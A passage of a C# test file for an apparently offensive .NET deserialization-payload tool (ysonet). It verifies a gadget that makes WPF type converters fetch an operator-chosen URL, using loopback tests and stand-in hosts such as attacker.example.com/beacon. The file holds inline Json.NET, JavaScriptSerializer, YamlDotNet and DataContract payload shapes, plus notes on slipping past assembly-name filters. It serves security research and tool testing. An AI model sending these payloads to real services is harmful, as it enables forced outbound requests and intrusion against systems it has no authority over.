using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Text;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;

// Tests for the XamlTypeConverterFetch gadget.
//
// WHAT THE RUNTIME-EFFECT ROW IS HERE. The payload is one XAML element with one attribute; the
// parser picks the attribute's [TypeConverter] and hands it the text, and the converter fetches
// it. So the sink is observed LOCALLY against a test-owned HTTP responder on an ephemeral
// loopback port: the responder records the exact request target. Nothing leaves the machine.
//
// The reply is deliberately NOT a valid image or cursor: the REQUEST is the whole effect, and
// what the decoder then does with the bytes is a per-VARIANT fact the row pins rather than
// assumes. Variant 1's decode is deferred, so the read completes CLEANLY; variant 2 hands the
// bytes to the Cursor constructor, which refuses them. Asserting the right one per variant is
// what stops the row degrading into "something threw somewhere".
//
// THE FORMATTER AUDIT IS A ROW, NOT A COMMENT, AND IT CHANGED THE GADGET. This carrier's trigger
// class is a [TypeConverter], which no other module here uses, so the formatter list could not be
// inherited from a sibling. The audit drives the SAME element and member through every format
// this project ships and records which ones make the request. The research dossiers this module
// came from called it XAML-only; the audit found that Json.NET, JavaScriptSerializer and
// YamlDotNet reach it too, because the ELEMENT carrying the attribute is an ordinary constructible
// type and those three convert a string to a member's declared type through the same converter.
// If a format that is not advertised ever fires, this row fails and the gadget has to grow.
namespace ysonet.Tests
{
    internal partial class Tests
    {
        private const string XtcGadget = "XamlTypeConverterFetch";

        private const string XtcImageDrawingTypeFullName = "System.Windows.Media.ImageDrawing";
        private const string XtcLabelTypeFullName = "System.Windows.Controls.Label";
        private const string XtcImageSourceTypeFullName = "System.Windows.Media.ImageSource";
        private const string XtcCursorTypeFullName = "System.Windows.Input.Cursor";
        private const string XtcFrameworkElementFullName = "System.Windows.FrameworkElement";

        private const string XtcPresentationCore =
            "PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        private const string XtcPresentationFramework =
            "PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";

        // Not a valid image and not a valid cursor, on purpose: the request is the effect, and a
        // decoder that then refuses the bytes is the expected outcome.
        private const string XtcResponseBody = "ysonet-not-an-image";

        private static int _xtcPathCounter;

        // What the gadget advertises. Four, not one: the carrier ELEMENT is an ordinary
        // constructible type with a writable member, so a member-naming format that converts a
        // string to that member's declared type reaches the same [TypeConverter] the XAML parser
        // would have used. That was measured by the audit row below, not predicted.
        private static readonly string[] XtcFormatters =
        {
            Formatters.Xaml,
            Formatters.JsonNet,
            Formatters.JavaScriptSerializer,
            Formatters.YamlDotNet,
        };

        // Everything else this project ships. The audit row drives the same element and member
        // through each one and requires silence.
        private static readonly string[] XtcImpossibleFormatters =
        {
            Formatters.FastJson,
            Formatters.MessagePackTypeless,
            Formatters.MessagePackTypelessLz4,
            Formatters.DataContractSerializer,
            Formatters.DataContractJsonSerializer,
            Formatters.NetDataContractSerializer,
            Formatters.SharpSerializerXml,
            Formatters.SharpSerializerBinary,
            Formatters.BinaryFormatter,
            Formatters.SoapFormatter,
            Formatters.LosFormatter,
            Formatters.FsPickler,
            Formatters.XmlSerializer,
        };

        private static readonly int[] XtcVariants =
        {
            XamlTypeConverterFetchGenerator.VariantImageSource,
            XamlTypeConverterFetchGenerator.VariantCursor,
        };

        private static void RunXamlTypeConverterFetchTests(TestRunOptions options)
        {
            Run("XamlTypeConverterFetch matches the framework contract it depends on",
                XamlTypeConverterFetchMatchesTheFrameworkContract);
            Run("XamlTypeConverterFetch generates every variant x minify cell",
                XamlTypeConverterFetchGeneratesEveryCell);
            Run("XamlTypeConverterFetch fetches a test-owned loopback URL on every "
                    + "formatter x variant",
                delegate { XamlTypeConverterFetchFetchesATestOwnedUrl(options != null && options.Full); });
            Run("XamlTypeConverterFetch is reachable from exactly the formats it "
                    + "advertises",
                XamlTypeConverterFetchIsReachableOnlyFromXaml);
            Run("XamlTypeConverterFetch needs a UI thread only for the cursor variant",
                XamlTypeConverterFetchNeedsAUiThreadOnlyForTheCursorVariant);
            Run("XamlTypeConverterFetch warns when variant 2's suffix condition is unmet",
                XamlTypeConverterFetchWarnsOnAMissingCursorSuffix);
            Run("XamlTypeConverterFetch self-tests through the product's own -t",
                XamlTypeConverterFetchSelfTestFetchesTheUrl);
            Run("XamlTypeConverterFetch carries only the element, member and URI",
                XamlTypeConverterFetchCarriesOnlyItsAttribute);
            Run("XamlTypeConverterFetch refuses the formatters its carrier cannot reach",
                XamlTypeConverterFetchRefusesImpossibleFormatters);
            Run("XamlTypeConverterFetch takes the URI as typed",
                XamlTypeConverterFetchTakesTheUriAsTyped);
            Run("XamlTypeConverterFetch refuses a URI minification would rewrite",
                XamlTypeConverterFetchRefusesLossyMinification);
            Run("XamlTypeConverterFetch resolves nothing at generation time",
                XamlTypeConverterFetchIsNotResolvedAtGenerationTime);
            Run("XamlTypeConverterFetch drives the interactive editor correctly",
                XamlTypeConverterFetchEditsInteractively);
            Run("XamlTypeConverterFetch declares real facets",
                XamlTypeConverterFetchDeclaresRealFacets);
        }

        // ---- helpers -----------------------------------------------------------

        private static InputArgs XtcInput(string uri, bool minify, params string[] extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = uri;
            ia.Test = false;
            ia.Minify = minify;
            if (extra != null && extra.Length > 0)
                ia.ExtraArguments = new List<string>(extra);
            return ia;
        }

        private static InputArgs XtcVariantInput(int variant, string uri, bool minify)
        {
            return XtcInput(uri, minify,
                "--" + XamlTypeConverterFetchGenerator.VariantOptionName, variant.ToString());
        }

        private static object BuildXtcPayload(string formatter, InputArgs ia)
        {
            return GadgetRegistry.CreateGadgetInstance(XtcGadget).GenerateWithInit(formatter, ia);
        }

        private static RunResult RunXtc(string formatter, InputArgs ia)
        {
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = XtcGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Variant 2's converter only fetches when the value ends .cur or .ani, so every URL a
        // cursor cell uses carries the suffix.
        private static string XtcNewPath(int variant)
        {
            string path = "/xtc" + System.Threading.Interlocked.Increment(ref _xtcPathCounter);
            return variant == XamlTypeConverterFetchGenerator.VariantCursor
                ? path + ".cur"
                : path + ".png";
        }

        // Read the payload the way a target would, and hand back whatever it threw.
        //
        // XamlReader.Load needs the single-threaded apartment a WPF host has. The three
        // member-naming formats are read on the CALLING thread on purpose: that is the realistic
        // case (a service deserializing JSON on a thread-pool thread), and running them on an STA
        // thread would quietly hide an apartment requirement the option help would then never
        // mention.
        private static Exception XtcRead(object payload, string formatter)
        {
            return XtcRead(payload, formatter, XtcNeedsSta(formatter,
                XamlTypeConverterFetchGenerator.VariantImageSource));
        }

        private static Exception XtcRead(object payload, string formatter, bool sta)
        {
            Exception error = null;
            System.Threading.ThreadStart body = delegate
            {
                try { PayloadReader.Read(payload, formatter, null); }
                catch (Exception e) { error = e; }
            };

            if (sta)
                RunSTA(body);
            else
                body();
            return error;
        }

        // Which apartment a target would have to be on, per cell. XamlReader.Load always needs
        // one; the three member-naming formats need one only for variant 2, whose carrier is a
        // FrameworkElement. Variant 1's carrier is a Freezable and works anywhere - that is why
        // it is the default, and the apartment row below measures both directions rather than
        // taking this helper's word for it.
        private static bool XtcNeedsSta(string formatter, int variant)
        {
            if (string.Equals(formatter, Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
                return true;
            return variant == XamlTypeConverterFetchGenerator.VariantCursor;
        }

        // The audit row's reader: EVERY format on an STA thread, so nothing is excluded merely
        // for being built on the wrong apartment. A format that fires only there is still a real
        // capability the gadget would have to advertise.
        private static Exception XtcReadOnSta(object payload, string formatter)
        {
            Exception error = null;
            RunSTA(delegate
            {
                try { PayloadReader.Read(payload, formatter, null); }
                catch (Exception e) { error = e; }
            });
            return error;
        }

        private static string XtcFlatten(Exception e)
        {
            if (e == null) return "<no exception>";
            Exception inner = e;
            while (inner.InnerException != null) inner = inner.InnerException;
            return inner.GetType().Name + ": " + inner.Message;
        }

        private static void XtcAssertThrowsWith(Action action, string needle, string msg)
        {
            string seen = null;
            try { action(); }
            catch (Exception e) { seen = XtcFlatten(e); }
            AssertTrue(seen != null, msg + " (nothing was thrown)");
            AssertTrue(seen != null && seen.IndexOf(needle, StringComparison.OrdinalIgnoreCase) >= 0,
                msg + " (wanted \"" + needle + "\", got \"" + seen + "\")");
        }

        // ---- rows --------------------------------------------------------------

        // Everything the technique needs, asserted from reflection rather than from the header
        // comment. Two halves: the converters really are attached to those types, and the two
        // structural facts that mean the CONVERTED type is never built by the payload.
        private static void XamlTypeConverterFetchMatchesTheFrameworkContract()
        {
            Type imageSource = Type.GetType(
                XtcImageSourceTypeFullName + ", " + XtcPresentationCore, true);
            Type cursor = Type.GetType(XtcCursorTypeFullName + ", " + XtcPresentationCore, true);

            AssertEqual("ImageSourceConverter",
                TypeDescriptor.GetConverter(imageSource).GetType().Name,
                "ImageSource's declared converter is the one the chain reads");
            AssertEqual("CursorConverter",
                TypeDescriptor.GetConverter(cursor).GetType().Name,
                "and Cursor's is CursorConverter");
            AssertTrue(TypeDescriptor.GetConverter(imageSource).CanConvertFrom(typeof(string)),
                "both convert FROM a string, which is what a XAML attribute hands them");
            AssertTrue(TypeDescriptor.GetConverter(cursor).CanConvertFrom(typeof(string)),
                "including the cursor one");

            // The two facts that mean the payload never builds the CONVERTED type. They are also
            // the reason an earlier sweep rejected Cursor for the wrong reason: constructibility
            // of the converted type is irrelevant when the converter is chosen by the member.
            AssertTrue(imageSource.IsAbstract,
                "ImageSource is abstract, so no format can construct one to assign");
            AssertTrue(cursor.GetConstructor(Type.EmptyTypes) == null,
                "and Cursor has no parameterless constructor");

            // The two members the payload names, and their declared types - which is what makes
            // the parser select the converters above.
            Type imageBrush = Type.GetType(
                XtcImageDrawingTypeFullName + ", " + XtcPresentationCore, true);
            PropertyInfo source = imageBrush.GetProperty(
                XamlTypeConverterFetchGenerator.ImageMemberName);
            AssertTrue(source != null && source.CanWrite,
                "ImageDrawing.ImageSource is a writable public property");
            AssertEqual(imageSource, source.PropertyType,
                "declared as ImageSource, which is what selects ImageSourceConverter");
            AssertTrue(imageBrush.GetConstructor(Type.EmptyTypes) != null,
                "and it is constructible, which is what lets a member-naming format carry it");

            // THE TWO REASONS VARIANT 1 USES ImageDrawing. Only a UI element demands an STA
            // thread, so a Freezable carrier is what makes variant 1 fire wherever the target
            // happens to deserialize; and a carrier that has a [TypeConverter] of its OWN cannot
            // be written as an object with a member at all (Json.NET refuses ImageBrush, which
            // inherits BrushConverter from Brush, with "the type requires a JSON string value").
            // Both are asserted from the framework so a change breaks the test, not the claim.
            Type freezable = Type.GetType(
                "System.Windows.Freezable, WindowsBase, Version=4.0.0.0, Culture=neutral, "
                + "PublicKeyToken=31bf3856ad364e35", true);
            AssertTrue(freezable.IsAssignableFrom(imageBrush),
                "ImageDrawing is a Freezable, not a UI element, so no apartment is required");

            Type label = Type.GetType(XtcLabelTypeFullName + ", " + XtcPresentationFramework, true);
            AssertTrue(!freezable.IsAssignableFrom(label),
                "while variant 2's carrier is not, which is where the UI-thread condition comes "
                    + "from");

            Type frameworkElement = Type.GetType(
                XtcFrameworkElementFullName + ", " + XtcPresentationFramework, true);
            PropertyInfo cursorMember = frameworkElement.GetProperty(
                XamlTypeConverterFetchGenerator.CursorMemberName);
            AssertTrue(cursorMember != null && cursorMember.CanWrite,
                "Cursor is a writable public property on FrameworkElement itself, which is why "
                    + "every element carries it");
            AssertEqual(cursor, cursorMember.PropertyType,
                "declared as Cursor, which is what selects CursorConverter");

            // Variant 2's whole input condition, taken from the converter rather than restated.
            AssertEqual(2, XamlTypeConverterFetchGenerator.CursorSuffixes.Length,
                "the cursor branch is gated on exactly two suffixes");
        }

        private static void XamlTypeConverterFetchGeneratesEveryCell()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(XtcGadget);
            AssertTrue(gen != null, "it resolves by name");

            AssertEqual(XtcFormatters.Length, gen.SupportedFormatters().Count,
                "every advertised formatter is covered here: "
                    + string.Join(", ", gen.SupportedFormatters().ToArray()));
            foreach (string formatter in XtcFormatters)
                AssertTrue(gen.IsSupported(formatter), formatter + " is advertised");
            AssertEqual(2, gen.Variants().Count, "two variants");

            foreach (string formatter in XtcFormatters)
                foreach (int variant in XtcVariants)
                    foreach (bool minify in new[] { false, true })
                    {
                        string cell = formatter + " variant " + variant
                            + (minify ? " +minify" : "");
                        RunResult res = RunXtc(formatter,
                            XtcVariantInput(variant, "http://attacker.example.com/x.cur", minify));

                        AssertTrue(res.Success, cell + " generates: " + res.ErrorMessage);
                        AssertTrue(!RawIsEmpty(res.Raw), cell + " payload is not empty");
                    }

            // An unknown variant is refused by name rather than silently building variant 1.
            XtcAssertThrowsWith(
                () => BuildXtcPayload(Formatters.JsonNet, XtcVariantInput(9, "http://h/x.cur", false)),
                "has no variant 9",
                "an unknown variant is refused");
        }

        // THE runtime-effect row, and the one that earns the version facet.
        //
        // Every advertised formatter x variant. Each cell starts a test-owned HTTP responder on an
        // ephemeral loopback port, generates the real payload against a run-unique path, reads it
        // with the reader a target would use, and requires exactly one request for that path.
        // Nothing leaves the machine.
        private static void XamlTypeConverterFetchFetchesATestOwnedUrl(bool full)
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "XamlTypeConverterFetch loopback fetch"))
                return;

            string[] formatters = full
                ? XtcFormatters
                : new[] { Formatters.Xaml, Formatters.JsonNet };
            bool[] minifyStates = full ? new[] { false, true } : new[] { false };
            var failures = new FailureCollector();

            foreach (string formatter in formatters)
                foreach (int variant in XtcVariants)
                    foreach (bool minify in minifyStates)
                    {
                        string cell = formatter + " variant " + variant
                            + (minify ? " +minify" : "");
                        using (var server = new LegacyXmlHttpServer())
                        {
                            try
                            {
                                string path = XtcNewPath(variant);
                                server.Serve(path, XtcResponseBody, "application/octet-stream");

                                object payload = BuildXtcPayload(formatter,
                                    XtcVariantInput(variant, server.UrlFor(path), minify));

                                Exception error = XtcRead(payload, formatter,
                                    XtcNeedsSta(formatter, variant));

                                if (server.WaitForRequest(path, MarkerWaitMs) == null)
                                {
                                    failures.AddCapability(TestEnvironment.LoopbackTcp, cell,
                                        cell + " -> no request for " + path + " arrived, so the "
                                            + "member did not reach the type converter (reader "
                                            + "said: " + XtcFlatten(error) + ")");
                                    continue;
                                }

                                int hits = 0;
                                foreach (string requested in server.Requests)
                                    if (string.Equals(requested, path, StringComparison.Ordinal))
                                        hits++;
                                if (hits != 1)
                                {
                                    failures.Add(cell + " -> " + hits + " requests for " + path
                                        + ", wanted exactly one");
                                    continue;
                                }

                                // WHAT THE TARGET SEES, per variant, and it is a real difference
                                // an operator picks between. Variant 1's decode is deferred, so
                                // the read completes cleanly and the target is handed no
                                // exception at all; variant 2's converter finishes by building a
                                // Cursor from the bytes, which refuses a body that is not a real
                                // cursor. Asserting the wrong one here would let a change that
                                // broke the deferred path pass unnoticed.
                                if (variant == XamlTypeConverterFetchGenerator.VariantImageSource)
                                {
                                    if (error != null)
                                        failures.Add(cell + " -> the read threw ("
                                            + XtcFlatten(error) + "), but variant 1's decode is "
                                            + "deferred and must complete cleanly");
                                }
                                else if (error == null)
                                {
                                    failures.Add(cell + " -> the read completed cleanly, but "
                                        + "variant 2 hands the fetched bytes to the Cursor "
                                        + "constructor, which must refuse this body");
                                }

                                RuntimeBuild.RecordFired(XtcGadget);
                            }
                            catch (Exception e)
                            {
                                failures.Add(cell + " -> " + e.GetType().Name + ": " + e.Message);
                            }
                        }
                    }

            AssertTrue(failures.Count == 0,
                "XamlTypeConverterFetch effect cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // THE FORMATTER AUDIT, and the row that decided the formatter list.
        //
        // Each format that is NOT advertised is handed the equivalent of the gadget's own
        // document - build a System.Windows.Controls.Image, put the URL in its Source member -
        // and is required to make NO request. A format that fired would be a real capability the
        // gadget is failing to advertise, so this row failing is an instruction to widen
        // SupportedFormatters(). That is not hypothetical: it is how Json.NET, JavaScriptSerializer
        // and YamlDotNet got in, against the research dossiers that called this carrier XAML-only.
        //
        // Every read runs on an STA thread, so nothing is excluded merely for being built on the
        // wrong apartment.
        private static void XamlTypeConverterFetchIsReachableOnlyFromXaml()
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "XamlTypeConverterFetch formatter audit"))
                return;

            string imageAqn = XtcImageDrawingTypeFullName + ", " + XtcPresentationCore;
            string imageShortName = imageAqn.Replace(", ", ",");
            const string member = "ImageSource";

            var fired = new List<string>();
            foreach (string formatter in XtcImpossibleFormatters)
            {
                using (var server = new LegacyXmlHttpServer())
                {
                    string path = XtcNewPath(XamlTypeConverterFetchGenerator.VariantImageSource);
                    server.Serve(path, XtcResponseBody, "application/octet-stream");
                    string url = server.UrlFor(path);

                    object document = null;
                    string skip = null;

                    if (string.Equals(formatter, Formatters.JsonNet, StringComparison.Ordinal))
                        document = "{'$type':'" + imageAqn + "','" + member + "':'" + url + "'}";
                    else if (string.Equals(formatter, Formatters.JavaScriptSerializer,
                            StringComparison.Ordinal))
                        document = "{'__type':'" + imageAqn + "','" + member + "':'" + url + "'}";
                    else if (string.Equals(formatter, Formatters.YamlDotNet,
                            StringComparison.Ordinal))
                        document = "!<!" + imageShortName + "> {\r\n  " + member + ": \"" + url
                            + "\"\r\n}";
                    else if (string.Equals(formatter, Formatters.FastJson,
                            StringComparison.Ordinal))
                        document = @"{""$types"":{""" + imageAqn + @""":""1""},""$type"":""1"","
                            + @"""" + member + @""":""" + url + @"""}";
                    else if (string.Equals(formatter, Formatters.MessagePackTypeless,
                            StringComparison.Ordinal)
                        || string.Equals(formatter, Formatters.MessagePackTypelessLz4,
                            StringComparison.Ordinal))
                        document = MessagePackTypelessTypeSwap.SerializeAs(
                            new XtcImageSurrogate { ImageSource = url }, imageAqn,
                            string.Equals(formatter, Formatters.MessagePackTypelessLz4,
                                StringComparison.Ordinal));
                    else if (string.Equals(formatter, Formatters.DataContractSerializer,
                            StringComparison.Ordinal))
                        document = "<root type=\"" + imageAqn + "\"><ImageDrawing xmlns=\""
                            + "http://schemas.datacontract.org/2004/07/System.Windows.Media"
                            + "\"><" + member + ">" + url + "</" + member + "></ImageDrawing></root>";
                    else if (string.Equals(formatter, Formatters.NetDataContractSerializer,
                            StringComparison.Ordinal))
                        document = "<ImageDrawing z:Type=\"" + XtcImageDrawingTypeFullName
                            + "\" z:Assembly=\"" + XtcPresentationCore + "\" xmlns=\""
                            + "http://schemas.datacontract.org/2004/07/System.Windows.Media"
                            + "\" xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\">"
                            + "<" + member + ">" + url + "</" + member + "></ImageDrawing>";
                    else if (string.Equals(formatter, Formatters.DataContractJsonSerializer,
                            StringComparison.Ordinal))
                        document = "{\"" + member + "\":\"" + url + "\"}";
                    else
                        // The remaining formats need a real instance to serialize (SharpSerializer,
                        // FsPickler, XmlSerializer) or refuse a non-[Serializable] type outright
                        // (BinaryFormatter, SoapFormatter, LosFormatter). Building a real Image
                        // and assigning Source WOULD fetch, inside this test rather than in a
                        // target, so the write side is deliberately not exercised: what is
                        // measured is that ysonet cannot ISSUE such a payload, which the refusal
                        // row next door asserts by name.
                        skip = "no ysonet-issuable document shape without building a real carrier";

                    if (skip != null)
                    {
                        Console.Error.WriteLine("  [xtc] " + formatter + ": " + skip);
                        continue;
                    }

                    Exception error = XtcReadOnSta(document, formatter);
                    bool requested = server.WaitForRequest(path, 1500) != null;
                    Console.Error.WriteLine("  [xtc] " + formatter + ": requested=" + requested
                        + " " + XtcFlatten(error));
                    if (requested)
                        fired.Add(formatter);
                }
            }

            AssertTrue(fired.Count == 0,
                "an unadvertised format drove the type converter and made the request, so the "
                    + "gadget is under-advertising itself: " + string.Join(", ", fired.ToArray()));

            // The other direction, so the row cannot pass because the harness is broken: every
            // ADVERTISED format really does fire through the same responder.
            foreach (string formatter in XtcFormatters)
                using (var server = new LegacyXmlHttpServer())
                {
                    string path = XtcNewPath(XamlTypeConverterFetchGenerator.VariantImageSource);
                    server.Serve(path, XtcResponseBody, "application/octet-stream");

                    object payload = BuildXtcPayload(formatter,
                        XtcInput(server.UrlFor(path), false));
                    XtcRead(payload, formatter,
                        XtcNeedsSta(formatter,
                            XamlTypeConverterFetchGenerator.VariantImageSource));

                    AssertTrue(server.WaitForRequest(path, MarkerWaitMs) != null,
                        formatter + ": the control fires, so the silence above is about the "
                            + "excluded formats and not about the responder");
                }
        }

        // THE APARTMENT CONDITION, measured in BOTH directions, because it is the one thing an
        // operator has to know before picking a variant and it is the whole reason variant 1's
        // carrier is a Freezable rather than the more familiar Image.
        //
        // Variant 1 fires on an ordinary thread; variant 2 does not, and the exception says why
        // before the converter is ever reached. Asserting only the first half would let a future
        // carrier change silently impose a UI-thread requirement on the default variant; asserting
        // only the second would let the documented reason drift from the real one.
        private static void XamlTypeConverterFetchNeedsAUiThreadOnlyForTheCursorVariant()
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "XamlTypeConverterFetch apartment condition"))
                return;

            // Half one: variant 1, Json.NET, on the CALLING thread. This is the realistic
            // "service deserializing JSON on a thread-pool thread" case.
            using (var server = new LegacyXmlHttpServer())
            {
                string path = XtcNewPath(XamlTypeConverterFetchGenerator.VariantImageSource);
                server.Serve(path, XtcResponseBody, "application/octet-stream");

                object payload = BuildXtcPayload(Formatters.JsonNet,
                    XtcVariantInput(XamlTypeConverterFetchGenerator.VariantImageSource,
                        server.UrlFor(path), false));
                Exception error = XtcRead(payload, Formatters.JsonNet, false);

                AssertTrue(server.WaitForRequest(path, MarkerWaitMs) != null,
                    "variant 1 fires with no UI thread at all, which is what its Freezable "
                        + "carrier buys (reader said: " + XtcFlatten(error) + ")");
            }

            // Half two: variant 2, same format, same thread. It must NOT fire, and the reason has
            // to be the apartment rather than anything about the converter.
            using (var server = new LegacyXmlHttpServer())
            {
                string path = XtcNewPath(XamlTypeConverterFetchGenerator.VariantCursor);
                server.Serve(path, XtcResponseBody, "application/octet-stream");

                object payload = BuildXtcPayload(Formatters.JsonNet,
                    XtcVariantInput(XamlTypeConverterFetchGenerator.VariantCursor,
                        server.UrlFor(path), false));
                Exception error = XtcRead(payload, Formatters.JsonNet, false);

                AssertTrue(server.WaitForRequest(path, 1500) == null,
                    "variant 2 does NOT fire off a UI thread, which is the condition the variant "
                        + "help states");
                AssertTrue(XtcFlatten(error).IndexOf("STA", StringComparison.Ordinal) >= 0,
                    "and it fails on the apartment, before the converter is reached: "
                        + XtcFlatten(error));
            }

            // Half three: the same variant 2 cell on an STA thread DOES fire, so the condition is
            // a thread requirement and not a broken payload.
            using (var server = new LegacyXmlHttpServer())
            {
                string path = XtcNewPath(XamlTypeConverterFetchGenerator.VariantCursor);
                server.Serve(path, XtcResponseBody, "application/octet-stream");

                object payload = BuildXtcPayload(Formatters.JsonNet,
                    XtcVariantInput(XamlTypeConverterFetchGenerator.VariantCursor,
                        server.UrlFor(path), false));
                XtcRead(payload, Formatters.JsonNet, true);

                AssertTrue(server.WaitForRequest(path, MarkerWaitMs) != null,
                    "and the same payload on a UI thread fires, so variant 2 is advertised for "
                        + "this format with a documented condition rather than excluded");
            }
        }

        // Variant 2 does nothing when the value misses the suffix, so the gadget says so - and
        // the row proves the warning is TRUE rather than just present.
        private static void XamlTypeConverterFetchWarnsOnAMissingCursorSuffix()
        {
            // The note is debug-mode only and goes to stderr, exactly like every other note in
            // this project.
            InputArgs noted = XtcVariantInput(XamlTypeConverterFetchGenerator.VariantCursor,
                "http://attacker.example.com/beacon", false);
            noted.IsDebugMode = true;

            var captured = new StringWriter();
            TextWriter previousError = Console.Error;
            try
            {
                Console.SetError(captured);
                RunXtc(Formatters.Xaml, noted);
            }
            finally { Console.SetError(previousError); }

            AssertTrue(captured.ToString().IndexOf(".cur", StringComparison.Ordinal) >= 0,
                "a value with no .cur or .ani suffix is called out: "
                    + Truncate(captured.ToString(), 300));

            // And it is NOT a refusal: the operator may know something the gadget does not.
            AssertTrue(BuildXtcPayload(Formatters.Xaml,
                    XtcVariantInput(XamlTypeConverterFetchGenerator.VariantCursor,
                        "http://attacker.example.com/beacon", false)) != null,
                "but the payload is still built, because input is documented not policed");

            // Variant 1 has no such condition, so it must stay silent.
            InputArgs quiet = XtcVariantInput(
                XamlTypeConverterFetchGenerator.VariantImageSource,
                "http://attacker.example.com/beacon", false);
            quiet.IsDebugMode = true;
            var quietCapture = new StringWriter();
            try
            {
                Console.SetError(quietCapture);
                RunXtc(Formatters.Xaml, quiet);
            }
            finally { Console.SetError(previousError); }
            AssertTrue(quietCapture.ToString().IndexOf(".cur", StringComparison.Ordinal) < 0,
                "variant 1 has no suffix condition, so it says nothing about one: "
                    + Truncate(quietCapture.ToString(), 300));

            // THE WARNING IS TRUE. A suffix-less cursor value really does request nothing, which
            // is the whole reason the note exists.
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "XamlTypeConverterFetch cursor suffix control"))
                return;

            using (var server = new LegacyXmlHttpServer())
            {
                string path = "/xtc-no-suffix"
                    + System.Threading.Interlocked.Increment(ref _xtcPathCounter);
                server.Serve(path, XtcResponseBody, "application/octet-stream");

                object payload = BuildXtcPayload(Formatters.Xaml,
                    XtcVariantInput(XamlTypeConverterFetchGenerator.VariantCursor,
                        server.UrlFor(path), false));
                XtcRead(payload, Formatters.Xaml);

                AssertTrue(server.WaitForRequest(path, 1500) == null,
                    "a cursor value with no .cur or .ani suffix takes the named-cursor branch and "
                        + "requests nothing, which is exactly what the note warns about");
            }
        }

        private static void XamlTypeConverterFetchSelfTestFetchesTheUrl()
        {
            foreach (string formatter in XtcFormatters)
                AssertTrue(PayloadReader.CanRead(formatter),
                    formatter + " is a format -t can read back at all");

            if (TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "XamlTypeConverterFetch -t fetch"))
            {
                foreach (string formatter in XtcFormatters)
                    foreach (int variant in XtcVariants)
                    {
                        using (var server = new LegacyXmlHttpServer())
                        {
                            string cell = formatter + " variant " + variant;
                            string path = XtcNewPath(variant);
                            server.Serve(path, XtcResponseBody, "application/octet-stream");

                            InputArgs ia = XtcVariantInput(variant, server.UrlFor(path), false);
                            ia.Test = true;

                            RunResult res = RunXtc(formatter, ia);
                            AssertTrue(res.Success,
                                cell + ": -t completes and still returns a payload even when the "
                                    + "decoder refuses the body: " + res.ErrorMessage);
                            AssertTrue(!RawIsEmpty(res.Raw),
                                cell + ": -t still returns the payload");
                            AssertTrue(server.WaitForRequest(path, MarkerWaitMs) != null,
                                cell + ": -t really fetched the URI from this process, which is "
                                    + "what the option help warns about");
                        }
                    }
            }

            // The other half of the probe-first order: a URI attribute normalization would rewrite
            // is refused and nothing is fetched, even with -t asked for.
            InputArgs lossy = XtcInput("http://host/a\tb", false);
            lossy.Test = true;
            RunResult refused = RunXtc(Formatters.Xaml, lossy);
            AssertTrue(!refused.Success,
                "a URI an XML attribute cannot carry is refused even with -t asked for");
        }

        // The payload is one element and one attribute. Anything else on it is weight an operator
        // did not ask for, and no gadget may name ITSELF.
        private static void XamlTypeConverterFetchCarriesOnlyItsAttribute()
        {
            const string url = "http://attacker.example.com/beacon.cur";

            foreach (string formatter in XtcFormatters)
                foreach (int variant in XtcVariants)
                    foreach (bool minify in new[] { false, true })
                    {
                        string text = (string)BuildXtcPayload(formatter,
                            XtcVariantInput(variant, url, minify));
                        string cell = formatter + " variant " + variant
                            + (minify ? " +minify" : "");

                        bool isImage =
                            variant == XamlTypeConverterFetchGenerator.VariantImageSource;
                        string element = isImage
                            ? XamlTypeConverterFetchGenerator.ImageElementName
                            : XamlTypeConverterFetchGenerator.CursorElementName;
                        string member = isImage
                            ? XamlTypeConverterFetchGenerator.ImageMemberName
                            : XamlTypeConverterFetchGenerator.CursorMemberName;

                        AssertTrue(text.IndexOf(element, StringComparison.Ordinal) >= 0,
                            cell + ": names the carrier the operator's target has to accept");
                        AssertTrue(text.IndexOf(member, StringComparison.Ordinal) >= 0,
                            cell + ": and carries the member whose declared type selects the "
                                + "converter");
                        AssertTrue(text.IndexOf(url, StringComparison.Ordinal) >= 0,
                            cell + ": and the operator's URI");

                        if (string.Equals(formatter, Formatters.Xaml, StringComparison.Ordinal))
                        {
                            // The XAML document is the short one: the presentation namespace
                            // resolves the element, so it names no assembly at all. That is the
                            // reason this variant of the payload survives a target that filters
                            // on assembly-qualified names.
                            AssertTrue(text.IndexOf(
                                    XamlTypeConverterFetchGenerator.WpfPresentationNamespace,
                                    StringComparison.Ordinal) >= 0,
                                cell + ": through the WPF presentation namespace");
                            AssertTrue(text.IndexOf("Presentation", StringComparison.Ordinal) < 0,
                                cell + ": so no assembly identity is on the wire");
                        }
                        else
                        {
                            // The member-naming formats have no namespace mechanism, so they must
                            // state the carrier's assembly-qualified name - and the two variants
                            // live in DIFFERENT assemblies, which is why this is per variant.
                            string assembly = isImage ? "PresentationCore" : "PresentationFramework";
                            AssertTrue(text.IndexOf(assembly, StringComparison.Ordinal) >= 0,
                                cell + ": names the carrier's assembly (" + assembly + "), which "
                                    + "a member-naming format has no other way to resolve");
                        }

                        AssertTrue(text.IndexOf("XamlTypeConverterFetch",
                                StringComparison.Ordinal) < 0,
                            cell + ": the payload does not name this gadget");
                        AssertTrue(text.IndexOf("ysonet", StringComparison.OrdinalIgnoreCase) < 0,
                            cell + ": nor the tool that built it");

                        // The other variant's member must not leak into this one: a payload
                        // carrying both would fetch twice and name a member the operator did not
                        // choose.
                        string otherMember = isImage
                            ? XamlTypeConverterFetchGenerator.CursorMemberName
                            : XamlTypeConverterFetchGenerator.ImageMemberName;
